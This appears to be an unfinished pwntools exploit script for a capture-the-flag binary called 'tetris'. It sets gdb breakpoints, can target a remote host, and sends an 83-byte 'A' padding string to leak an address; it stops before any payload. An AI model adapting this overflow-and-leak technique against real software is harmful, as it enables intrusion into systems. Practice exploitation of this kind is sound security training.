from pwn import *


PROGRAM_PATH = (Path(__file__).parent / "tetris").resolve().__str__()
# b *0x40131e
#
gdb_script = """
b *main+15
b *main+277
c
"""

frame_size = 0x70  # 1536
rbp = 8


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


io = start()
io.recvuntil("$ ")
print("____________________________________")

# Leak the address
io.sendline("p")
io.recvuntil(":")
io.sendline((84 - 1) * b"A")


io.recvline()
io.recvuntil("offset ")
leak_addr = io.recvline()


io.interactive()
